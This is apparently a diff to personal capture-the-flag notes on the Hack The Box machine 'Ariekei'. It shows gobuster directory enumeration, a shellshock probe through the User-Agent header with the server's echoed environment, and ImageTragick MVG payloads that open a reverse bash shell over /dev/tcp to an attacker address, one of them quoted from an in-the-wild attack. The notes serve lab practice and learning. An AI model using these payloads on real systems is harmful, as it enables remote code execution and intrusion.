@@ -96,7 +96,7 @@ not same with
 curl -k --ssl https://10.10.10.65/cgi-bin/
 
 ```
- gobuster -k  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  https://beehive.ariekei.htb  -f
+     gobuster -k  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  https://beehive.ariekei.htb  -f
 
 =====================================================
 
@@ -105,6 +105,82 @@ curl -k --ssl https://10.10.10.65/cgi-bin/
 [+] Mode         : dir
 [+] Url/Domain   : https://beehive.ariekei.htb/
 [+] Threads      : 10
-[+] Wordl`
+/blog/ (Status: 200)
+/cgi-bin/ (Status: 403)
+/icons/ (Status: 403)
+
+```
+
+####  cgi-bin 
+
+```
+gobuster -k  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  https://beehive.ariekei.htb/cgi-bin/
+/stats (Status: 200)
+```
+
+#### shellshock rabbit hole 
+
+get  /cgi-bin/stats HTTP/1.1
+
+<pre>
+Tue Mar 19 14:34:37 UTC 2019
+14:34:37 up 1 day, 15:53, 0 users, load average: 0.00, 0.02, 0.00
+GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.
+
+https://dedetoknotes.blogspot.com/2015/07/shellshock-vulnerability-on-bash-shell.html
+
+Shellshock Vulnerability on Bash Shell
+
+This is how you test your bash shell whether its vulnerable or not for 'shellsock' bug.
+Run this on your linux shell (you don't need super user account for this):
+ $ env x='() { :;}; echo vulnerable' bash -c "echo this is a test" , but **it fully filters** 
+
+```shell
+GET /cgi-bin/stats HTTP/1.1
+Host: beehive.ariekei.htb
+User-Agent: (){:;};echo;echo
+
+SERVER_SIGNATURE=<address>Apache/2.2.22 (Debian) Server at beehive.ariekei.htb Port 80</address>
+
+HTTP_USER_AGENT=(){:;};echo;echo
+HTTP_X_FORWARDED_FOR=10.10.14.27
+SERVER_PORT=80
+HTTP_HOST=beehive.ariekei.htb
+HTTP_X_REAL_IP=10.10.14.27
+DOCUMENT_ROOT=/home/spanishdancer/content
+SCRIPT_FILENAME=/usr/lib/cgi-bin/stats
+REQUEST_URI=/cgi-bin/stats
+SCRIPT_NAME=/cgi-bin/stats
+HTTP_CONNECTION=close
+REMOTE_PORT=55502
+```
+
+
+
+#### Enum Calvin
+
+```
+gobuster -k  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  https://calvin.ariekei.htb
+/upload (Status: 200)
+```
+
+#### imagemagick  Tragick  
+
+https://blog.sucuri.net/2016/05/analyzing-imagetragick-exploits-in-the-wild.html
+
+```
+push graphic-context
+viewbox 0 0 640 480 fill 'url(https://\x22|setsid /bin/bash -i >/dev/tcp/106.186.30.7/443 0<&1 2>&1")'
+```
+
+https://github.com/dorkerdevil/ImageTragick_exploit, A tool to exploit imagetragick vulnerability to gain remote code execution.
+
+```shell
+#### payload 
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://"|setsid /bin/bash -i >& /dev/tcp/10.10.14.27/443 0<&1 2>&1")'
+pop graphic-context
+
 ```
 
